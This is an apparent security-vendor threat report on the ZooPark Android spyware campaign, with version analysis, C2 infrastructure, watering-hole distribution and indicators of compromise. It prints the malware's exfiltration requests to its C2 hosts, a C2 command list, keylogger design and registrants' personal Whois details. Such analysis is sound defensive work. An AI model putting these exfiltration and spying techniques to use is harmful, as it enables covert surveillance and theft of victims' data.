{
    "id": "8afffe68-a677-4549-a69c-68a14297fcd5",
    "created_at": "2022-10-25T16:48:21.019895Z",
    "updated_at": "2025-03-27T02:16:26.365627Z",
    "deleted_at": null,
    "sha1_hash": "8a8e334f804ece05996db6dbe8c055991cca013e",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-05-03T14:30:23Z",
    "file_modification_date": "2018-05-03T14:30:31Z",
    "file_size": 2664994,
    "plain_text": "#### May 2018\n\n# WHO’S WHO IN THE ZOO. CYBERESPIONAGE OPERATION TARGETS ANDROID USERS IN THE MIDDLE EAST.\n\n\n-----\n\n###### Contents\n\nTechnical Details ............................................................................................................... 3\n\nVersion 1.0 - circa 2015 ............................................................................................................. 4\n\nVersion 2.0 (2016) - lightweight spyware ................................................................................... 6\n\nVersion 3.0 (2016) - commercial fork ......................................................................................... 9\n\nVersion 4.0 (2017) - modern spyware ...................................................................................... 11\n\nInfrastructure ................................................................................................................... 20\n\nrhubarb2[.]com ......................................................................................................................... 21\n\nrhubarb3[.]com ......................................................................................................................... 21\n\n5.61.27[.]157 ............................................................................................................................ 23\n\n5.61.27[.]154 ............................................................................................................................ 24\n\nDistribution ...................................................................................................................... 25\n\nTelegram channels ................................................................................................................... 25\n\nWatering holes ......................................................................................................................... 27\n\nVictims ............................................................................................................................. 33\n\nConclusions ..................................................................................................................... 34\n\nAppendix - Indicators of compromise ............................................................................... 35\n\nMalware samples ..................................................................................................................... 35\n\nC2 servers ................................................................................................................................ 36\n\nWatering holes ......................................................................................................................... 36\n\n###### 1\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nZooPark is a cyberespionage operation that has been focusing on Middle Eastern targets\nsince at least June 2015. The threat actors behind ZooPark infect Android devices using\nseveral generations of malware we label from v1-v4, with v4 being the most recent version\ndeployed in 2017.\n\nThe preferred infection vector for ZooPark is waterhole attacks. We found several news\nwebsites that have been hacked by the attackers to redirect visitors to a downloading site\nthat serves malicious APKs. Some of the themes observed in campaign include “Kurdistan\nreferendum”, “TelegramGroups” and “Alnaharegypt news”, among others.\n\nTarget profile has evolved during the last years of campaign, focusing on victims in Egypt,\nJordan, Morocco, Lebanon and Iran.\n\n###### 2\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n## Technical Details\n\nThe malware used in ZooPark operations spans across multiple versions, with the attackers\nincluding new features in each iteration. The following chart summarizes the main features\nadded in new generations:\n\n_Evolution of ZooPark malware features_\n\n###### 3\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 3\n\n\n-----\n\nIn this section we will detail the main technical features of the malware used in this\ncampaign.\n\n### Version 1.0 - circa 2015\n\nThe first version of the malware that we found (EC5A6F0E743F4B858ABA9DE96A33FB0C)\nis pretty simple. The certificate used has been valid since 2015:\n\n_Malware certificate_\n\nIt has only two functions – stealing contacts from the address book and accounts registered\non the victim device. The malware mimics a Telegram application:\n\nAfter being manually launched, it checks for an internet connection. If unavailable, it only\nshows a dialog with an alert in Farsi:\n\n.ﻟطﻔﺎ ﺑﮫ اﯾﻧﺗرﻧت ﻣﺗﺻل ﺷده و ﯾﮑﺑﺎر دﯾﮕر ﺑرﻧﺎﻣﮫ را اﺟرا ﮐﻧﯾد\n\n\"Please connect to the internet and run the program again.”\n\nWhen the connection is stable, the malware sends a request to the C2 server, encoding the\nstolen data (contacts and accounts) in base64:\n\n###### 4\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n“hxxp://www.rhubarb2[.]com/telg/sv/sv[.]php” {‘id’: Base64Encode(id), ‘data’:\nBase64Encode(contacts)}\n\n“hxxp://www.rhubarb2[.]com/get/index[.]php?id=” + Base64Encode(\"gogo\") + \"&user=\" +\nBase64Encode(\"TelgramGp\") + \"&pass=\" + Base64Encode(\"TelgramGp\") + \"&data=\" +\nBase64Encode(accounts))\n\nThis is followed by the content of the website being displayed (not available at the moment):\n\n“hxxp://www.rhubarb2[.]com/telg/index.php?set=show”\n\nwithin the app. We found that the content is available in the new server used by the\nattackers (rhubarb3[.]com):\n\n_This is a list of Iranian Telegram channels. Any additional channel can be added to the form above._\n\n###### 5\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 5\n\n\n-----\n\n### Version 2.0 (2016) - lightweight spyware\n\nWe found that all samples of this version are signed by the same debug certificate:\n\nSerial Number: 0x1\n\nIssuer: C=US, O=Android, CN=Android Debug\n\nValidity: from = Mon May 30 12:44:34 MSK 2016\n\nSHA-1 Fingerprint: E2 7D 9A 46 81 AD 65 5A A1 5E E7 8A D7 53 51 90 E6 C1 CA FF\n\nFor this version, every sample contains a hardcoded configuration that contains its C2\naddress and variables for use in the request:\n\n**6a388edbce88bb033** **cb67abd070ae18839** **e2f62b5acf3795a62e9**\n**1ae875ceeb2f319** **0fc040cbe60e677** **d54e1301c4e7b**\n\n**Baseurl** \"http://www.rhubarb3.com/\" \"http://www.rhubarb3.com/\" \"http://www.rhubarb3.com/\"\n\n**FunctionCode** \"none\" \"none\" \"none\"\n\n**UserLocation** \"\" \"\" \"\"\n\n**TypeFile** \"(ALLINONE)\" \"(Referendum)\" \"(Postrall-SSS)\"\n\n**KeyKey** \"dafak\" \"dafak\" \"dafak\"\n\nIn the table above, the TypeFile variable is the application that the malware mimics.\n\nThis new version is similar to the previous. The main difference is the inclusion of new\nspying features such as exfiltrate GPS location, SMS messages, call logs and some extra\ngeneral information.\n\n_General information collected by ver.2_\n\n###### 6\nWho’s who in the Zoo Cyberespionage operation targets\n\n|Col1|6a388edbce88bb033 1ae875ceeb2f319|cb67abd070ae18839 0fc040cbe60e677|e2f62b5acf3795a62e9 d54e1301c4e7b|\n|---|---|---|---|\n|Baseurl|\"http://www.rhubarb3.com/\"|\"http://www.rhubarb3.com/\"|\"http://www.rhubarb3.com/\"|\n|FunctionCode|\"none\"|\"none\"|\"none\"|\n|UserLocation|\"\"|\"\"|\"\"|\n|TypeFile|\"(ALLINONE)\"|\"(Referendum)\"|\"(Postrall-SSS)\"|\n|KeyKey|\"dafak\"|\"dafak\"|\"dafak\"|\n\n\n###### 6\n\n\n-----\n\nAdditionally, there is a strange feature called “pic”.\n\n_Pic feature_\n\nThis reads the content of the file “zoo.zoo” (located on the memory card, in the picture/photo\npath), encodes it with Base64 and sends it to the server, removing the original file. This file is\na photo silently captured by the frontal camera, and we believe it was probably created by\nsome unknown malware component.\n\nOne of the samples (6A388EDBCE88BB0331AE875CEEB2F319) mimics the All-in-One\nmessenger application. After launch, it only presents a credential form if the date on the\ndevice is prior to 2017.01.01 (hardcoded). Otherwise, it just executes System.exit().\n\n###### 7\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 7\n\n\n-----\n\n_Phishing form 6A388EDBCE88BB0331AE875CEEB2F319_\n\nObviously, after clicking the ‘Login’ button, credentials will be sent to the C2 server, in a\nsimilar request to that used in version 1.0:\n\nV1:\n\nhxxp://www.rhubarb2[.]com/get/index[.]php?id=\" + Base64Encode(\"gogo\") + \"&user=\" +\nBase64Encode(\"TelgramGp\") + \"&pass=\" + Base64Encode(\"TelgramGp\") + \"&data=\" +\nBase64Encode(accounts))\n\nV2:\n\nhxxp://www.rhubarb3[.]com/get/index[.]php?id=\" + Base64Encode(\"gogo\") + \"&user=\" +\nBase64Encode(entered_email) + \"&pass=\" + Base64Encode(entered_password) +\n\"&data=\" + Base64Encode(\"[AllInOne]\" + accounts)\n\nThis seems to confirm that the C2 servers used by both versions have a very similar\nbackend.\n\n###### 8\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n### Version 3.0 (2016) - commercial fork\n\nThis version of the malware is especially interesting due to the notable similarities to the\n[commercial spyware product Spymaster Pro. There are several code similarities, with the](http://www.spymasterpro.com/)\nmain difference being that ZooPark uses its own command and control server:\n\n_Spymaster Pro code fragment_\n\n_ZooPark code fragment_\n\nFrom the screenshots above, Spymaster Pro uses\nhxxp://www.spymasterpro[.]com/spyMobile/upload[.]php and ZooPark hxxp://*own C2\n**server*/ + /spyMobile/upload.php.**\n\nIn order to get its C2 address, ZooPark v3 sends a request to an intermediate server to\ndownload a file that looks like a normal picture (androidupdaters[.]com/img.jpg):\n\n###### 9\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nThe file looks like a typical JPG but appends an IP address that will be used for the C2.\n\nThere are some details that seem to demonstrate that ZooPark developers did not fully\nunderstand the Spymaster Pro code they were reusing. In the case of the SmsReceiver\nfunction, we can see how in both implementations they use the “PASSWORD” variable:\n\n_Spymaster Pro and ZooPark code comparison_\n\nThe difference is that Spymaster Pro uses this variable for SMS message encryption, while\nZooPark uses an own hardcoded AES key, so the “PASSWORD” variable left in the code\nhas no purpose.\n\n###### 10\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 10\n\n\n-----\n\nAll the observed v3 samples are signed by one of the following three certificates:\n\n**Serial Number** **Valid from** **Signed malware MD5**\n\n0x1 (debug) Jun 19 07:25:37 MSK 7D7AD116E6A42D4E518378E2313E93\n2016 92\n\n0x709decd2 Aug 14 12:52:59 MSK A7D00C8629079F944B61C4DD5C77C8\n2016 FB\n\nAC4402E04DE0949D7BEED975DB84E\n594\n\n0x60b364bc Apr 14 10:44:04 MSK B714B092D2F28FCF78EF8D02B46DBF\n2016 9C\n\nThis version introduces a number of improvements compared to the previous self-developed\nversions:\n\n     - Call records (audio);\n\n     - Browser data – bookmarks and history;\n\n     - Installed application details;\n\n     - Photos and pictures from memory card.\n\n### Version 4.0 (2017) - modern spyware\n\nThis malware variant represents a significant improvement on version 2.0, which seems to\nindicate that version 3.0 was some kind of fork.\n\n###### 11\nWho’s who in the Zoo Cyberespionage operation targets\n\n|Serial Number|Valid from|Signed malware MD5|\n|---|---|---|\n|0x1 (debug)|Jun 19 07:25:37 MSK 2016|7D7AD116E6A42D4E518378E2313E93 92|\n|0x709decd2|Aug 14 12:52:59 MSK 2016|A7D00C8629079F944B61C4DD5C77C8 FB|\n|||AC4402E04DE0949D7BEED975DB84E 594|\n|0x60b364bc|Apr 14 10:44:04 MSK 2016|B714B092D2F28FCF78EF8D02B46DBF 9C|\n\n\n-----\n\n_Version 4 malicious code structure_\n\nOnce again, all observed samples are signed by the same certificate, this time valid since 2017:\n\n###### 12\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 12\n\n\n-----\n\nAll the samples represents backdoored legitimate applications with malicious code injection:\n\n**MD5** **Package** **ITW name**\n\n519018ecfc50c0cf6cd0c88cc41b2a ltd.banehappy.drofirewall FirewallFA.apk\n69\n\n5ad36f6dd060e52771a8e4a1dd90c free.vpn.proxy.unblock.android.easy.a DVPNEasy.apk\n50c pp\n\nb44b91b14f176fbf93d998141931a4 com.del.tele.acc DeleteTelegram.apk\naa\n\nSince this version has evolved from v2, its configuration is very similar to the previous variant:\n\n**519018ecfc50c0cf6** **5ad36f6dd060e52771** **b44b91b14f176fbf93d**\n**cd0c88cc41b2a69** **a8e4a1dd90c50c** **998141931a4aa**\n\n**Baseurl** \"http://www.rhubarb \"http://www.rhubarb3.c \"http://www.rhubarb3.c\n3.com/\" om/\" om/\"\n\n**FunctionCode** \"none\" \"none\" \"none\"\n\n**UserLocation** \"\" \"\" \"\"\n\n**TypeFile** \"(FirewallFA)\" \"(VPNEasy)\" \"(DeleteTelegram)\"\n\n**KeyKey** \"dafak\" \"dafak\" \"dafak\"\n\nEven if the Baseurl is the address of the C2 server, this is a legacy variable from version 2.\nActually, the main C2 server address is determined like in version 3, by sending a request to\nan intermediate server. All the samples found contain two encrypted intermediate server\naddresses:\n\n###### 13\nWho’s who in the Zoo Cyberespionage operation targets\n\n|MD5|Package|ITW name|\n|---|---|---|\n|519018ecfc50c0cf6cd0c88cc41b2a 69|ltd.banehappy.drofirewall|FirewallFA.apk|\n|5ad36f6dd060e52771a8e4a1dd90c 50c|free.vpn.proxy.unblock.android.easy.a pp|DVPNEasy.apk|\n|b44b91b14f176fbf93d998141931a4 aa|com.del.tele.acc|DeleteTelegram.apk|\n\n|Col1|519018ecfc50c0cf6 cd0c88cc41b2a69|5ad36f6dd060e52771 a8e4a1dd90c50c|b44b91b14f176fbf93d 998141931a4aa|\n|---|---|---|---|\n|Baseurl|\"http://www.rhubarb 3.com/\"|\"http://www.rhubarb3.c om/\"|\"http://www.rhubarb3.c om/\"|\n|FunctionCode|\"none\"|\"none\"|\"none\"|\n|UserLocation|\"\"|\"\"|\"\"|\n|TypeFile|\"(FirewallFA)\"|\"(VPNEasy)\"|\"(DeleteTelegram)\"|\n|KeyKey|\"dafak\"|\"dafak\"|\"dafak\"|\n\n\n###### 13\n\n\n-----\n\nAfter decoding IMAGE_ADDRESSES the real request would be:\n\nThen the malware finds out which of the requested images contains a valid IP address for\nthe main C2 server, like version 3.\n\n_google_logo.jpg_\n\n_The main C2 server has an IP from the same subnet as version 3_\n\nThe main entry point for this version is triggered by two specific events:\n\nThis receiver starts the main malicious service called GooglePlayService, which controls\nother components. After launch, it creates all the working directories, inits the database and\nchecks if the current device is rooted by searching for the following su binaries and\nSuperuser.apk:\n\n###### 14\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nIt also registers two additional receivers:\n\nThey are triggered after the device connection changes or the screen turns on/off. In the first\ncase it starts uploading the stolen data to the C2; in the second it processes preloaded C2\nserver commands.\n\nThis version has a huge internal configuration containing dozens of parameters that regulate\nthe malicious activities. This configuration can be updated from the C2 server.\n\nPart of the stolen information is stored in an internal SQL database, called testunitdb.\nActually, this version is able to steal additional information compared to version 3:\n\n     - Browser data: search history;\n\n     - Clipboard data;\n\n     - Keylogs;\n\nThe keylogger implementation based on the AccessibilityService is something we have\nalready seen in other spyware families. Basically, it listens for specific events such as\nchanging the text of any EditText element on the screen (type = 16), opening a\nPopupWindow, Menu, Dialog, etc. (for instance, windows that may contain EditText fields\n(type = 32)). When the second event is found, the malware initializes the keylogger instance,\nlogging typed text and the related contextual application name.\n\n###### 15\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 15\n\n\n-----\n\nThis means the Keylogger is able to log any typed credentials for any application with\nsystem forms.\n\n     - Arbitrary files/folders;\n\n     - Capturing photos/videos/audio;\n\n     - Capturing screenshots/screen records;\n\n     - External applications data – default list: Telegram, WhatsApp, IMO, Chrome (can be\nextended in the configuration).\n\n_External apps attacked by ZooPark malware_\n\nThis version also implements some backdoor functionality:\n\n     - Shell command execution (with or without root);\n\n     - Silently sending SMSs;\n\n     - Making calls.\n\n###### Communications with C2 server\nAfter the malware obtains the main C2 address, it connects to the C2 server on port 6666.\nAll the transmitted data is encrypted with RSA, with its Java public key file located in\n\\assets\\puki.\n\nIt also generates an AES key and sends it to the C2 server for additional responses.\n[Interestingly, the developers used the “secure random” fix for key generation:](https://android-developers.googleblog.com/2013/08/some-securerandom-thoughts.html)\n\n###### 16\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 16\n\n\n-----\n\nThis shows the developers’ concerns about cryptography. Since this attack is very targeted,\nwe can assume the developers paid special attention to work on outdated devices that are\nvulnerable to this “insecure random” attack.\n\nHere is the scheme of client-server communications:\n\nInterestingly, the malware decrypts and saves commands received from its C2 server in files\nwithin its own directory to process them later:\n\n###### 17\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 17\n\n\n-----\n\nAs mentioned in this code snippet, the malware operates with “Pac” serializable objects that\nare used as tasks from the server to execute (when the “type” value is even) and as report\ncontainers for C2 submission (when the “type” value is odd). The “Pac” report with the\ncompleted task has a “type” value +1 compared to the related task. All reports are saved in\nthe “TO_GO” directory.\n\nHere is the full list of possible tasks from the C2 server:\n\n**Pac** **Description**\n**type**\n\n2 Update malware with specified config.\n\n4 Execute shell command with runtime.\n\n6 Zip specified file/folder and save it in the “TO_GO” directory.\n\n8 Write task content in temporary zip file, extract everything from it and delete it.\n\n10 Copy specified file/folder to specified directory.\n\n12 Move specified file/folder to specified directory.\n\n14 Rename specified file/folder.\n\n16 Delete specified file/folder.\n\n18 Make specified directory.\n\n20 Silently send SMS to specified number with specified content.\n\n22 Make a call to specific number.\n\n24 Create a file system tree of the specified path and save it in the “TO_GO”\ndirectory.\n\n26 Update intermediate C2 server list (servers with images).\n\nThe malware also starts a shell server that can execute commands without root privileges on\nthe victim device:\n\n###### 18\nWho’s who in the Zoo Cyberespionage operation targets\n\n|Pac type|Description|\n|---|---|\n|2|Update malware with specified config.|\n|4|Execute shell command with runtime.|\n|6|Zip specified file/folder and save it in the “TO_GO” directory.|\n|8|Write task content in temporary zip file, extract everything from it and delete it.|\n|10|Copy specified file/folder to specified directory.|\n|12|Move specified file/folder to specified directory.|\n|14|Rename specified file/folder.|\n|16|Delete specified file/folder.|\n|18|Make specified directory.|\n|20|Silently send SMS to specified number with specified content.|\n|22|Make a call to specific number.|\n|24|Create a file system tree of the specified path and save it in the “TO_GO” directory.|\n|26|Update intermediate C2 server list (servers with images).|\n\n\n-----\n\nThe SHELL_SERVER_PORT value will be submitted to the C2 server, so the attackers will\nbe able to connect.\n\n###### 19\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n## Infrastructure\n\nWe have detected the following infrastructure used in this campaign:\n\n**Server** **Malware** **Activity** **Description**\n**version** **period**\n\nentekhab10[.]xp3[.]biz V.1 2015-2016 Intermediate server\n\nrhubarb2[.]com V.1, V.2 (?) 2015-2016 C2 server/intermediate server\n\nrhubarb3[.]com V.2, V.4 2016-present C2 server\n\nandroidupdaters[.]com V.3, V.4 2016-present Intermediate server (image)\n\ndlgmail[.]com V.4 2016-2017 Intermediate server (image)\n\n5.61.27[.]154 V.4 present C2 server\n\n5.61.27[.]157 V.3 present C2 server\n\nThe following table summarizes the most interesting data from their Whois records:\n\nandroidupdaters[.]c dlgmail[.]com rhubarb2[.]com\nom\n\nEmail: asgharkhof@gmail. silent.city2020@mail. pilton86@yahoo.c\ncom com om\n\nCity, Tehran, Tehran, Sanandaj,\nStreet saadat abaad, valiasr balatar az Baharan\n\ndarya blvd vanak k sharifi p5 v15\n\nName parspack 62555 mohammad hosein Mohsen Malekian\nasna ashar\n\nPostal 9865214523 1663976888 6614478527\nCode\n\nPhone +98.2188561212 +98.2188888299 +98.9303938251\n\n**IP** 178.162.214.146 46.4.41.195 109.200.28.162\n\n###### 20\nWho’s who in the Zoo Cyberespionage operation targets\n\n|Server|Malware version|Activity period|Description|\n|---|---|---|---|\n|entekhab10[.]xp3[.]biz|V.1|2015-2016|Intermediate server|\n|rhubarb2[.]com|V.1, V.2 (?)|2015-2016|C2 server/intermediate server|\n|rhubarb3[.]com|V.2, V.4|2016-present|C2 server|\n|androidupdaters[.]com|V.3, V.4|2016-present|Intermediate server (image)|\n|dlgmail[.]com|V.4|2016-2017|Intermediate server (image)|\n|5.61.27[.]154|V.4|present|C2 server|\n|5.61.27[.]157|V.3|present|C2 server|\n\n|Col1|androidupdaters[.]c om|dlgmail[.]com|rhubarb2[.]com|rhubarb3[.]com|\n|---|---|---|---|---|\n|Email:|asgharkhof@gmail. com|silent.city2020@mail. com|pilton86@yahoo.c om|PrivacyProtect|\n|City, Street|Tehran, saadat abaad, darya blvd|Tehran, valiasr balatar az vanak k sharifi p5 v15|Sanandaj, Baharan|PrivacyProtect|\n|Name|parspack 62555|mohammad hosein asna ashar|Mohsen Malekian|PrivacyProtect|\n|Postal Code|9865214523|1663976888|6614478527|PrivacyProtect|\n|Phone|+98.2188561212|+98.2188888299|+98.9303938251|PrivacyProtect|\n|IP|178.162.214.146|46.4.41.195|109.200.28.162|5.144.130.33 46.4.74.56|\n\n\n-----\n\n### rhubarb2[.]com\n\nThis server was used as C2 server for versions 1 and 2. Whois record:\n\nRegistrant Name: ﻣﺤﺴﻦ ﻣﻠﮑﯿﺎن        //Mohsen Malekian\n\nRegistrant Organization:\n\nRegistrant Street: ﺑﮭﺎران             //Baharan\n\nRegistrant City: ﺳﻨﻨﺪج               //Sanandaj (capital of Kurdistan Province in Iran)\n\nRegistrant State/Province:\n\nRegistrant Postal Code: 6614478527\n\nRegistrant Country: IR\n\nRegistrant Phone: +98.9303938251\n\nRegistrant Email: pilton86@yahoo.com\n\n### rhubarb3[.]com\n\nThis server seems to mirror rhubarb2[.]com, including paths:\n\n/telg/sv/sv[.]php\n\n/telg/index[.]php\n\n/get/index[.]php\n\nAttackers relocated this C2 domain from 5.144.130.33 (located in Iran) to 46.4.74.56 in July\n2017:\n\n_Rhubarb3.com IP history_\n\n###### 21\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 21\n\n\n-----\n\nFolders in the open listing directory “/get/main/” were deployed in August 2016, when the\ndomain was registered.\n\nThe timestamp of the Parent Directory for “/images” (Templated.co web interface) coincides\nwith domain relocation:\n\n###### 22\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nAn inactive web interface login page at hxxp://www.rhubarb3[.]com/login[.]php points to the\nattackers previous C2 server rhubarb2[.]com:\n\nThe server’s response error discloses environment paths:\n\n<b>Warning</b>: Cannot modify header information - headers already sent by (output\nstarted at /home3/rhubarbc/public_html/get/main/index.php:1) in\n<b>/home3/rhubarbc/public_html/get/main/index.php</b> on line <b>6</b><br />\n\n### 5.61.27[.]157\n\nThis is the c2 server for malware version 3. As already mentioned, this version is based on\nthe commercial product Spymaster Pro, so the server side is similar.\n\nThe gate that handled requests from infected devices named “/spyMobile/” is exactly the\nsame gate used by the commercial spyware product.\n\nEven some commented HTML seems to come originally from Spymaster Pro:\n\n###### 23\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nApparently ‘Apasecman - Android KeyLogger’ was the original name given to this project by\nthe attackers.\n\n### 5.61.27[.]154\n\nThis is C2 server used in the last known version of this malware. The server-side\ntimestamps are also recent:\n\n###### 24\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 24\n\n\n-----\n\n## Distribution\n\nWe have observed two main distribution vectors – telegram channels and watering holes.\n\n### Telegram channels\n\nSeveral samples (version 1.0 in this specific case) mimicked a voting application for the\nIranian Kurdistan province:\n\nInside the code we found a reference to the Telegram channel:\n\nString v3 = String.valueOf(String.valueOf(\"ﺑﺎ ﺳﻼم\\n\") + \" ﻟﯾﻧﮏ درﯾﺎﻓت ﻧرم اﻓزار اﻧﺗﺧﺎﺑﺎت آﻧﻼﯾن اﺳﺗﺎن\nﮐردﺳﺗﺎن ﺑﮫ ھﻣراه آﻣﺎر آﻧﻼﯾن در ﮐﺎﻧﺎل زﯾر\\n\")\n\n+ \"http://telegram.me/entekhab_10\\n\";\n\nTranslation:\n\nHi\n\nThe link to download the election software online in Kurdistan province with online\nstatistics at the following channel http://telegram.me/entekhab_10\n\n###### 25\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 25\n\n\n-----\n\n_https://telegram.me/entekhab_10_\n\nPolls for candidates in Kurdistan province with mobile voting software\n\nContact Admin: @Entekhab_10_Admin\n\nThis channel was created on November 11, 2015 with the latest activity dated April 5, 2016.\n\nIt shows election information among version 1.0 malware samples:\n\n###### 26\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n### Watering holes\n\nWe collected evidence that attackers deployed at least two watering holes to distribute their\nmalware; in these cases version 3 of the malware was used.\n\nalnaharegypt[.]com\n\nAl-Nahar is one of the most popular Egyptian news sites, rated 19th in Egypt by popularity\n[according to Alexa.](https://www.alexa.com/siteinfo/alnaharegypt.com)\n\nBelow is a page from the site with news about the dollar exchange rate on the black market\n(hxxp://www.alnaharegypt.com/t~467369):\n\n###### 27\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n_Page infected with malicious iframe_\n\n###### 28\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nThe page had an iframe pointing to a malicious APK:\n\n_hxxp://showroommontorgueil[.]com/modules/homepageadvertise2/slides/alnaharegypt.news_v2.0[.]apk_\n\nIt would start downloading the malicious APK in Android without any notification, though a\nmodern browser such as Chrome will notify the user before starting the download. The\nmalicious APK name (alnaharegypt.news_v2.0.apk) mimics the waterholed site.\n\nWe took a closer look at the site hosting the malicious APK file showroommontorgueil[.]com. It was the site of a French fashion brand:\n\n_Showroommontorgueil.com state on 2016-01-16_\n\n###### 29\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nDespite the fact the site is currently unavailable, based on the watering hole URL we can tell\n[that it was a PrestaShop web application. And if we look for serious security vulnerabilities](https://www.prestashop.com/en)\nthere is an important one related to [file uploading. It allows a remote attacker to upload an](https://www.prestashop.com/forums/topic/544578-major-security-issues-with-few-modules-and-themes/)\narbitrary file by abusing PrestaShop modules, and as a result take control of the victim’s\nserver.\n\nMoreover, there is a list of URLs on Pastebin that look like vulnerable or already pawned\nPrestaShop sites, and it contains showroommontorgueil.com:\n\n_[https://pastebin.com/KuFxy6w5 - list of probably uploaded php reverse shell scripts](https://pastebin.com/KuFxy6w5)_\n\nAnd the last point is the cached deface state of showroommontorgueil.com hacked by\n[Indonesian Code Party:](https://www.facebook.com/IndonesianCodeParty/)\n\n_http://www.zone-h[.]org/mirror/id/26443808?zh=2_\n\n###### 30\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\nIt looks like the main interest of this hacking group is defacing vulnerable websites and they\nare probably unrelated to the campaign actors.\n\nAll this suggests that showroommontorgueil.com was hacked and probably by multiple\nattackers.\n\n_Ordered events related to the watering hole deployment on alnaharegypt[.]com_\n\n###### alhayatnews[.]com\n[This news site is one of the leading daily pan-Arab newspapers, popular in Lebanon and](https://en.wikipedia.org/wiki/Al-Hayat)\nJordan.\n\nAccording to our telemetry, the malware was served on 2016-09-12 from:\n\nhxxp://www.alhayatnews[.]com/ArabicRSS[.]apk\n\n###### annahar[.]com\nAn-Nahar is a leading Arabic daily newspaper published in Lebanon. We found some traces\nsuggesting that maybe there was a watering hole on their site, though we can´t confirm this.\nIn particular, one of the samples (ac4402e04de0949d7beed975db84e594) mimics the AnNahar official mobile application, which makes us believe the malware was probably\ndistributed in a similar way through the legitimate site.\n\n###### 31\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n###### 31\n\n\n-----\n\n_https://play.google.com/store/apps/details?id=com.ann.newspaper_\n\n_Legitimate app that malware mimics_\n\n###### 32\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n## Victims\n\nSome of the analyzed samples provide clues about the intended targets for this campaign.\n\nFor instance, the sample CB67ABD070AE188390FC040CBE60E677 mimics a voting\n[application for the independence referendum in Kurdistan:](https://en.wikipedia.org/wiki/Iraqi_Kurdistan_independence_referendum,_2017)\n\nClicking it will show an image used by Kurdish referendum supporters and offer different\nvoting options:\n\nOther possible high-profile targets include the United Nations Relief and Works Agency for\nPalestine Refugees in the Near East (UNRWA) in Amman, Jordan.\n\n###### 33\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n## Conclusions\n\nFrom the technical point of view, the evolution of ZooPark has shown notable progress: from\nthe very basic first and second versions, the commercial spyware fork in its third version and\nthen to the complex spyware that is version 4. This last step is especially interesting,\nshowing a big leap from straightforward code functionality to highly sophisticated malware.\n\nThis suggests the latest version may have been bought from vendors of specialist\nsurveillance tools. That wouldn’t be surprising, as the market for these espionage tools is\n[growing, becoming popular among governments, with several known cases](https://motherboard.vice.com/en_us/article/gy8gmb/area-surveillance-tech-european-police-congress) in the Middle\nEast. Also, choosing mobile platforms for espionage campaigns is just a natural evolutionary\nstep. At this point, we cannot confirm attribution to any known actor.\n\nIf you would like to learn more about our intelligence reports or request more information on\n[a specific report, contact us at: intelreports@kaspersky.com.](mailto:intelreports@kaspersky.com)\n\n###### 34\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----\n\n## Appendix - Indicators of compromise\n\n### Malware samples\n\n**MD5** **Filename**\n\nVersion 1.0\n\n232BD3DDE6914DB0A3DBFC21ED178887 Entekhab10 V1.apk\n\n5EFDDD7F0FC2125E78A2CA18B68464EC Entekhab10-v3.apk\n\nEC5A6F0E743F4B858ABA9DE96A33FB0C TelegramGroups.apk\n\nVersion 2.0\n\n6A388EDBCE88BB0331AE875CEEB2F319 AllInOne.apk\n\nE2F62B5ACF3795A62E9D54E1301C4E7B <unknown>\n\nCB67ABD070AE188390FC040CBE60E677 Referendum Kurdistan.apk\n\n699A7EEDD244F402303BCFFDEE1F0ED1 <unknown>\n\nVersion 3.0\n\n7D7AD116E6A42D4E518378E2313E9392 Sexy_wallpaper.apk\n\nA7D00C8629079F944B61C4DD5C77C8FB ArabicRSS.apk\n\nAC4402E04DE0949D7BEED975DB84E594 com.ann.newspaper.apk\n\nB714B092D2F28FCF78EF8D02B46DBF9C Alnaharegypt.news_v2.0.apk\nfamilyinnovation_app.apk\n\nVersion 4.0\n\n519018ECFC50C0CF6CD0C88CC41B2A69 FirewallFA.apk\n\n5AD36F6DD060E52771A8E4A1DD90C50C DVPNEasy.apk\n\nB44B91B14F176FBF93D998141931A4AA DeleteTelegram.apk\n\n###### 35\nWho’s who in the Zoo Cyberespionage operation targets\n\n|MD5|Filename|\n|---|---|\n|Version 1.0||\n|232BD3DDE6914DB0A3DBFC21ED178887|Entekhab10 V1.apk|\n|5EFDDD7F0FC2125E78A2CA18B68464EC|Entekhab10-v3.apk|\n|EC5A6F0E743F4B858ABA9DE96A33FB0C|TelegramGroups.apk|\n|Version 2.0||\n|6A388EDBCE88BB0331AE875CEEB2F319|AllInOne.apk|\n|E2F62B5ACF3795A62E9D54E1301C4E7B|<unknown>|\n|CB67ABD070AE188390FC040CBE60E677|Referendum Kurdistan.apk|\n|699A7EEDD244F402303BCFFDEE1F0ED1|<unknown>|\n|Version 